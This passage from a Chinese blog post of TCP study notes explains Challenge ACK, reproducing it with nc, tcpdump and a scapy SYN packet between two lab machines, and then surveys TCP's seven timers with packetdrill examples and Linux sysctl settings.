<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i any port 9090 -nn  -S</span><br></pre></td></tr></table></figure>
<p>在机器 B 使用 nc 命令连接机器 A 的 nc 服务器，输入 “hello” 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.211.55.10 9090</span><br></pre></td></tr></table></figure>

<p>使用 netstat 可以看到此次连接的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name</span><br><span class="line">tcp        0      0 10.211.55.10:9090       10.211.55.20:50718      ESTABLISHED 9029&#x2F;nc</span><br></pre></td></tr></table></figure>
<p>在机器 B 上使用 scapy，模拟发送 SYN 包，scapy 脚本如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst&#x3D;&quot;10.211.55.10&quot;)&#x2F;TCP(sport&#x3D;50718, dport&#x3D;9090, seq&#x3D;10, flags&#x3D;&#39;S&#39;))</span><br></pre></td></tr></table></figure>
<p>源端口号 sport 使用此次连接的临时端口号 50718，序列号随便写一个，这里 seq 为 10。</p>
<p>执行 scapy 执行上面的代码，tcpdump 中显示的包结果如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">执行 scapy 执行上面的代码，tcpdump 中显示的包结果如下。</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; nc 终端中 hello 请求包</span><br><span class="line">18:41:51.956735 IP 10.211.55.20.50718 &gt; 10.211.55.10.9090: Flags [P.], seq 3219267420:3219267426, ack 2848436085, win 229, options [nop,nop,TS val 1094540820 ecr 12823113], length 6</span><br><span class="line">18:41:51.956787 IP 10.211.55.10.9090 &gt; 10.211.55.20.50718: Flags [.], ack 3219267426, win 227, options [nop,nop,TS val 12827910 ecr 1094540820], length 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; scapy 的 SYN 包</span><br><span class="line">18:44:32.373331 IP 10.211.55.20.50718 &gt; 10.211.55.10.9090: Flags [S], seq 10, win 8192, length 0</span><br><span class="line">18:44:32.373366 IP 10.211.55.10.9090 &gt; 10.211.55.20.50718: Flags [.], ack 3219267426, win 227, options [nop,nop,TS val 12988327 ecr 1094540820], length 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到，对于一个 SEQ 为随意的 SYN 包，TCP 回复了正确的 ACK 包，其确认号为 3219267426。</p>
<p>从 rfc793 文档中也可以看到：</p>
<pre><code>Linux 内核对于收到的乱序 SYN 报文，会回复一个携带了正确序列号和确认号的 ACK 报文。</code></pre>
<p>这个 ACK 被称之为 <code>Challenge ACK</code>。</p>
<p>我们后面要介绍的杀掉连接工具 killcx 的原理，正是是基于这一点。</p>
<h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>为了方便说明，我们记发送 SYN 报文的一端为 A，处于 ESTABLISHED 状态接收 SYN 报文的一端为 B，B 对收到的 SYN 包回复 ACK 的原因是想让对端 A 确认之前的连接是否已经失效，以便做出一些处理。</p>
<p>对于 A 而已，如果之前的连接还在，对于收到的 ACK 包，正常处理即可，不再讨论。</p>
<p>如果 A 之前的此条连接已经不在了，此次 SYN 包是想发起新的连接，对于收到的 ACK 包，会立即回复一个 RST，且 RST 包的序列号就等于 ACK 包的序列号，B 收到这个合法的 RST 包以后，就会将连接释放。A 此时若想继续与 B 创建连接，则可以选择再次发送 SYN 包，重新建连，如下图所示。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/175.jpg"></p>
<p>接下来我们来看内核源码的处理，</p>
<h3 id="内核源码分析"><a href="#内核源码分析" class="headerlink" title="内核源码分析"></a>内核源码分析</h3><h3 id="小结-19"><a href="#小结-19" class="headerlink" title="小结"></a>小结</h3><p>这篇文章介绍了为什么 <code>ESTABLISHED</code> 状态连接的需要对 SYN 包做出响应，<code>Challenge ACK</code> 是什么，使用 scapy 复现了现象，演示了 SystemTap 内核探针调试工具的使用，最后通过修改系统变量复现了 ACK 限速。</p>
<h2 id="31-定时器一览-——-细数-TCP-的定时器们"><a href="#31-定时器一览-——-细数-TCP-的定时器们" class="headerlink" title="31 定时器一览 —— 细数 TCP 的定时器们"></a>31 定时器一览 —— 细数 TCP 的定时器们</h2><p>TCP 为每条连接建立了 7 个定时器：</p>
<p>1.连接建立定时器</p>
<p>2.重传定时器</p>
<p>3.延迟 ACK 定时器</p>
<p>4.PERSIST 定时器</p>
<p>5.KEEPALIVE 定时器</p>
<p>6.FIN_WAIT_2 定时器</p>
<p>7.TIME_WAIT 定时器</p>
<p>大部分定时器在前面的文章已经介绍过了，这篇文章来总结一下。</p>
<h3 id="0x01-连接建立定时器（connection-establishment）"><a href="#0x01-连接建立定时器（connection-establishment）" class="headerlink" title="0x01 连接建立定时器（connection establishment）"></a>0x01 连接建立定时器（connection establishment）</h3><p>当发送端发送 SYN 报文想建立一条新连接时，会开启连接建立定时器，如果没有收到对端的 ACK 包将进行重传。</p>
<p>可以用一个最简单的 packetdrill 脚本来模拟这个场景</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 新建一个 server socket</span><br><span class="line">+0   socket(..., SOCK_STREAM, IPPROTO_TCP) &#x3D; 3</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 客户端 connect</span><br><span class="line">+0 connect(3, ..., ...) &#x3D; -1</span><br></pre></td></tr></table></figure>
<p>抓包结果如下</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/176.jpg"></p>
<p>在我的电脑上，将重传 6 次（间隔 1s、2s、4s、8s、16s、32s），6 次重试以后放弃重试，connect 调用返回 -1，调用超时，</p>
<p>这个值是由<code>/proc/sys/net/ipv4/tcp_syn_retries</code>决定的， 在我的 Centos 机器上，这个值等于 6</p>
<p>整个过程如下： </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/177.jpg"></p>
<p>如果是用 Java 语言就会返回<code>java.net.ConnectException: Connection timed out</code>异常</p>
<h3 id="0x02-重传定时器（retransmission）"><a href="#0x02-重传定时器（retransmission）" class="headerlink" title="0x02 重传定时器（retransmission）"></a>0x02 重传定时器（retransmission）</h3><p>第一个定时器讲的是连接建立没有收到 ACK 的情况，如果在发送数据包的时候没有收到 ACK 呢？这就是这里要讲的第二个定时器重传定时器。重传定时器在之前的文章中有专门一篇文章介绍，重传定时器的时间是动态计算的，取决于 RTT 和重传的次数。</p>
<p>还是用 packetdrill 脚本的方式来模拟</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0   socket(..., SOCK_STREAM, IPPROTO_TCP) &#x3D; 3</span><br><span class="line">+0  setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) &#x3D; 0</span><br><span class="line">+0  bind(3, ..., ...) &#x3D; 0</span><br><span class="line">+0  listen(3, 1) &#x3D; 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 三次握手</span><br><span class="line">+0  &lt; S 0:0(0) win 4000 &lt;mss 1000&gt;</span><br><span class="line">+0  &gt; S. 0:0(0) ack 1 &lt;...&gt;</span><br><span class="line">+.1 &lt; . 1:1(0) ack 1 win 4000</span><br><span class="line">+0  accept(3, ..., ...) &#x3D; 4</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 往 fd 为 4 的 socket 文件句柄写入 1000 个字节数据（也即向客户端发送数据）</span><br><span class="line">+0  write(4, ..., 1000) &#x3D; 1000</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 注释掉 向协议栈注入 ACK 包的代码，模拟客户端不回 ACK 包的情况</span><br><span class="line">&#x2F;&#x2F; +.1 &lt; . 1:1(0) ack 1001 win 1000</span><br><span class="line"></span><br><span class="line">+0 &#96;sleep 1000000&#96;</span><br></pre></td></tr></table></figure>
<p>抓包结果如下 </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/178.jpg"></p>
<p>重传时间间隔是指数级退避，直到达到 120s 为止，重传次数是15次（这个值由操作系统的 <code>/proc/sys/net/ipv4/tcp_retries2</code> 决定)，总时间将近 15 分钟。</p>
<p>整个过程如下图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/179.jpg"></p>
<h3 id="0x03-延迟-ACK-定时器"><a href="#0x03-延迟-ACK-定时器" class="headerlink" title="0x03 延迟 ACK 定时器"></a>0x03 延迟 ACK 定时器</h3><p>在 TCP 收到数据包以后在没有数据包要回复时，不马上回复 ACK。这时开启一个定时器，等待一段时间看是否有数据需要回复。如果期间有数据要回复，则在回复的数据中捎带 ACK，如果时间到了也没有数据要发送，则也发送 ACK。在 Centos7 上这个值为 <code>40ms</code>。这里在延迟确认章节有详细的介绍，不再展开。 </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/180.jpg"></p>
<h3 id="0x04-持续计时器（persist-timer）"><a href="#0x04-持续计时器（persist-timer）" class="headerlink" title="0x04 持续计时器（persist timer）"></a>0x04 持续计时器（persist timer）</h3><p>Persist 定时器是专门为零窗口探测而准备的。我们都知道 TCP 利用滑动窗口来实现流量控制，当接收端 B 接收窗口为 0 时，发送端 A 此时不能再发送数据，发送端此时开启 Persist 定时器，超时后发送一个特殊的报文给接收端看对方窗口是否已经恢复，这个特殊的报文只有一个字节。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/181.jpg"></p>
<h3 id="0x05-保活定时器（keepalive-timer）"><a href="#0x05-保活定时器（keepalive-timer）" class="headerlink" title="0x05 保活定时器（keepalive timer）"></a>0x05 保活定时器（keepalive timer）</h3><p>如果通信以后一段时间有再也没有传输过数据，怎么知道对方是不是已经挂掉或者重启了呢？于是 TCP 提出了一个做法就是在连接的空闲时间超过 2 小时，会发送一个探测报文，如果对方有回复则表示连接还活着，对方还在，如果经过几次探测对方都没有回复则表示连接已失效，客户端会丢弃这个连接。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/182.jpg"></p>
<h3 id="0x06-FIN-WAIT-2-定时器"><a href="#0x06-FIN-WAIT-2-定时器" class="headerlink" title="0x06 FIN_WAIT_2 定时器"></a>0x06 FIN_WAIT_2 定时器</h3><p>四次挥手过程中，主动关闭的一方收到 ACK 以后从 <code>FIN_WAIT_1</code> 进入 FIN_WAIT_2 状态等待对端的 FIN 包的到来，FIN_WAIT_2 定时器的作用是防止对方一直不发送 FIN 包，防止自己一直傻等。这个值由/proc/sys/net/ipv4/tcp_fin_timeout 决定，在我的 Centos7 机器上，这个值为 60s </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/184.jpg"></p>
<h3 id="0x07-TIME-WAIT-定时器"><a href="#0x07-TIME-WAIT-定时器" class="headerlink" title="0x07 TIME_WAIT 定时器"></a>0x07 TIME_WAIT 定时器</h3><p>TIME_WAIT 定时器也称为 2MSL 定时器，可能是这七个里面名气最大的，主动关闭连接的一方在 TIME_WAIT 持续 2 个 MSL 的时间，超时后端口号可被安全的重用。 </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/185.jpg"></p>
<p>TIME_WAIT存在的意义有两个：</p>
<pre><code>可靠的实现 TCP 全双工的连接终止（处理最后 ACK 丢失的情况）
避免当前关闭连接与后续连接混淆（让旧连接的包在网络中消逝）</code></pre>
<h3 id="小结-20"><a href="#小结-20" class="headerlink" title="小结"></a>小结</h3><p>以上就是 TCP 的 7 个定时器的全部内容，每一个的细节都在之前的文章中有详细的介绍，如果有不太明白的地方可以翻阅</p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机基础</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">计算机基础-计算机网络知识</a>
        		</li>
      		
		</ul>
	</div>

    

    

    
    
<div class="share-btn share-icons tooltip-left">
  <div class="tooltip tooltip-east">
    <span class="tooltip-item">
      <a href="javascript:;" class="share-sns share-outer">
        <i class="icon icon-share"></i>
      </a>
    </span>
    <span class="tooltip-content">
      <div class="share-wrap">
        <div class="share-icons">
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="icon icon-weibo"></i>
          </a>
          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="icon icon-weixin"></i>
          </a> -->
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="icon icon-qq"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="icon icon-douban"></i>
          </a>
          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a>
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="icon icon-facebook"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="icon icon-twitter"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="icon icon-google"></i>
          </a>
        </div>
      </div>
    </span>
  </div>
</div>

<div class="page-modal wx-share js-wx-box">
    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码"> -->
    </div>
</div>

<div class="mask js-mask"></div>

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>


<nav id="article-nav">
  
    <a href="/2021/03/13/%E7%AE%97%E6%B3%95-2021%E5%B9%B43%E6%9C%8813%E6%97%A5%E7%BE%8E%E5%9B%A2%E7%AC%94%E8%AF%95/" id="article-nav-newer" class="article-nav-link-wrap">
      <i class="icon-circle-left"></i>
      <div class="article-nav-title">
        
          算法-2021年3月13日美团笔试
        
      </div>
    </a>
  
  
    <a href="/2021/03/09/mysql%E5%AD%A6%E4%B9%A0-%E6%8E%98%E9%87%91%E5%B0%8F%E5%86%8Cmysql/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">MySQL学习-掘金小册mysql</div>
      <i class="icon-circle-right"></i>
    </a>
  
</nav>


<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>
















          </div>
        </div>
      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2021 <a href="http://caciacc.top/" target="_blank">caciaCC</a>
    	</div>
      	<div class="footer-right">
			
			
      		<a href="https://github.com/litten/hexo-theme-yilia" target="_blank">hexo-theme-yilia</a> by Litten
      	</div>
    </div>
  </div>
  
  
  
</footer>

    </div>
    <script>
	var yiliaConfig = {
		mathjax: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		toc_hide_index: true,
		root: "/",
		innerArchive: true,
		showTags: true
	}
</script>

<script>!function(r){function e(t){if(i[t])return i[t].exports;var n=i[t]={exports:{},id:t,loaded:!1};return r[t].call(n.exports,n,n.exports,e),n.loaded=!0,n.exports}var i={};e.m=r,e.c=i,e.p="./",e(0)}([function(t,n,r){r(208),t.exports=r(205)},function(t,n,r){var d=r(3),y=r(46),g=r(26),b=r(27),x=r(47),m="prototype",S=function(t,n,r){var e,i,o,u,c=t&S.F,f=t&S.G,a=t&S.S,s=t&S.P,l=t&S.B,h=f?d:a?d[n]||(d[n]={}):(d[n]||{})[m],v=f?y:y[n]||(y[n]={}),p=v[m]||(v[m]={});for(e in f&&(r=n),r)o=((i=!c&&h&&void 0!==h[e])?h:r)[e],u=l&&i?x(o,d):s&&"function"==typeof o?x(Function.call,o):o,h&&b(h,e,o,t&S.U),v[e]!=o&&g(v,e,u),s&&p[e]!=o&&(p[e]=o)};d.core=y,S.F=1,S.G=2,S.S=4,S.P=8,S.B=16,S.W=32,S.U=64,S.R=128,t.exports=S},function(t,n,r){var e=r(5);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n,r){var e=r(118)("wks"),i=r(79),o=r(3).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n,r){var e=r(49),i=Math.min;t.exports=function(t){return 0<t?i(e(t),9007199254740991):0}},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n,r){t.exports=!r(4)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(2),i=r(174),o=r(53),u=Object.defineProperty;n.f=r(10)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){t.exports=!r(20)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(14),i=r(24);t.exports=r(12)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var e=r(22),i=r(60),o=r(42),u=Object.defineProperty;n.f=r(12)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){var e=r(96),i=r(34);t.exports=function(t){return e(i(t))}},function(t,n,r){var e=r(40)("wks"),i=r(25),o=r(6).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n,r){var e=r(51);t.exports=function(t){return Object(e(t))}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){var r=t.exports={version:"2.6.9"};"number"==typeof __e&&(__e=r)},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n,r){var e=r(18);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){t.exports=!0},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var r=0,e=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++r+e).toString(36))}},function(t,n,r){var e=r(11),i=r(75);t.exports=r(10)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var o=r(3),u=r(26),c=r(30),f=r(79)("src"),e=r(219),i="toString",a=(""+e).split(i);r(46).inspectSource=function(t){return e.call(t)},(t.exports=function(t,n,r,e){var i="function"==typeof r;i&&(c(r,"name")||u(r,"name",n)),t[n]!==r&&(i&&(c(r,f)||u(r,f,t[n]?""+t[n]:a.join(String(n)))),t===o?t[n]=r:e?t[n]?t[n]=r:u(t,n,r):(delete t[n],u(t,n,r)))})(Function.prototype,i,function(){return"function"==typeof this&&this[f]||e.call(this)})},function(t,n,r){var e=r(1),i=r(4),u=r(51),c=/"/g,o=function(t,n,r,e){var i=String(u(t)),o="<"+n;return""!==r&&(o+=" "+r+'="'+String(e).replace(c,"&quot;")+'"'),o+">"+i+"</"+n+">"};t.exports=function(n,t){var r={};r[n]=t(o),e(e.P+e.F*i(function(){var t=""[n]('"');return t!==t.toLowerCase()||3<t.split('"').length}),"String",r)}},function(t,n,r){var e=r(65),i=r(35);t.exports=Object.keys||function(t){return e(t,i)}},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n,r){var e=r(117),i=r(75),o=r(33),u=r(53),c=r(30),f=r(174),a=Object.getOwnPropertyDescriptor;n.f=r(10)?a:function(t,n){if(t=o(t),n=u(n,!0),f)try{return a(t,n)}catch(t){}if(c(t,n))return i(!e.f.call(t,n),t[n])}},function(t,n,r){var e=r(30),i=r(17),o=r(154)("IE_PROTO"),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=i(t),e(t,o)?t[o]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},function(t,n,r){var e=r(116),i=r(51);t.exports=function(t){return e(i(t))}},function(t,n){t.exports=function(t){if(null==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n){t.exports={}},function(t,n){n.f={}.propertyIsEnumerable},function(t,n,r){var e=r(14).f,i=r(9),o=r(16)("toStringTag");t.exports=function(t,n,r){t&&!i(t=r?t:t.prototype,o)&&e(t,o,{configurable:!0,value:n})}},function(t,n,r){var e=r(40)("keys"),i=r(25);t.exports=function(t){return e[t]||(e[t]=i(t))}},function(t,n,r){var e=r(19),i=r(6),o="__core-js_shared__",u=i[o]||(i[o]={});(t.exports=function(t,n){return u[t]||(u[t]=void 0!==n?n:{})})("versions",[]).push({version:e.version,mode:r(23)?"pure":"global",copyright:"© 2019 Denis Pushkarev (zloirock.ru)"})},function(t,n){var r=Math.ceil,e=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(0<t?e:r)(t)}},function(t,n,r){var i=r(18);t.exports=function(t,n){if(!i(t))return t;var r,e;if(n&&"function"==typeof(r=t.toString)&&!i(e=r.call(t)))return e;if("function"==typeof(r=t.valueOf)&&!i(e=r.call(t)))return e;if(!n&&"function"==typeof(r=t.toString)&&!i(e=r.call(t)))return e;throw TypeError("Can't convert object to primitive value")}},function(t,n,r){var e=r(6),i=r(19),o=r(23),u=r(44),c=r(14).f;t.exports=function(t){var n=i.Symbol||(i.Symbol=o?{}:e.Symbol||{});"_"==t.charAt(0)||t in n||c(n,t,{value:u.f(t)})}},function(t,n,r){n.f=r(16)},function(t,n){var r={}.toString;t.exports=function(t){return r.call(t).slice(8,-1)}},function(t,n){var r=t.exports={version:"2.6.9"};"number"==typeof __e&&(__e=r)},function(t,n,r){var o=r(21);t.exports=function(e,i,t){if(o(e),void 0===i)return e;switch(t){case 1:return function(t){return e.call(i,t)};case 2:return function(t,n){return e.call(i,t,n)};case 3:return function(t,n,r){return e.call(i,t,n,r)}}return function(){return e.apply(i,arguments)}}},function(t,n,r){"use strict";var e=r(4);t.exports=function(t,n){return!!t&&e(function(){n?t.call(null,function(){},1):t.call(null)})}},function(t,n){var r=Math.ceil,e=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(0<t?e:r)(t)}},function(t,n,r){var x=r(47),m=r(116),S=r(17),w=r(8),e=r(138);t.exports=function(l,t){var h=1==l,v=2==l,p=3==l,d=4==l,y=6==l,g=5==l||y,b=t||e;return function(t,n,r){for(var e,i,o=S(t),u=m(o),c=x(n,r,3),f=w(u.length),a=0,s=h?b(t,f):v?b(t,0):void 0;a<f;a++)if((g||a in u)&&(i=c(e=u[a],a,o),l))if(h)s[a]=i;else if(i)switch(l){case 3:return!0;case 5:return e;case 6:return a;case 2:s.push(e)}else if(d)return!1;return y?-1:p||d?d:s}}},function(t,n){t.exports=function(t){if(null==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n,r){var i=r(1),o=r(46),u=r(4);t.exports=function(t,n){var r=(o.Object||{})[t]||Object[t],e={};e[t]=n(r),i(i.S+i.F*u(function(){r(1)}),"Object",e)}},function(t,n,r){var i=r(5);t.exports=function(t,n){if(!i(t))return t;var r,e;if(n&&"function"==typeof(r=t.toString)&&!i(e=r.call(t)))return e;if("function"==typeof(r=t.valueOf)&&!i(e=r.call(t)))return e;if(!n&&"function"==typeof(r=t.toString)&&!i(e=r.call(t)))return e;throw TypeError("Can't convert object to primitive value")}},function(t,n,r){var d=r(6),y=r(19),g=r(93),b=r(13),x=r(9),m="prototype",S=function(t,n,r){var e,i,o,u=t&S.F,c=t&S.G,f=t&S.S,a=t&S.P,s=t&S.B,l=t&S.W,h=c?y:y[n]||(y[n]={}),v=h[m],p=c?d:f?d[n]:(d[n]||{})[m];for(e in c&&(r=n),r)(i=!u&&p&&void 0!==p[e])&&x(h,e)||(o=i?p[e]:r[e],h[e]=c&&"function"!=typeof p[e]?r[e]:s&&i?g(o,d):l&&p[e]==o?function(e){var t=function(t,n,r){if(this instanceof e){switch(arguments.length){case 0:return new e;case 1:return new e(t);case 2:return new e(t,n)}return new e(t,n,r)}return e.apply(this,arguments)};return t[m]=e[m],t}(o):a&&"function"==typeof 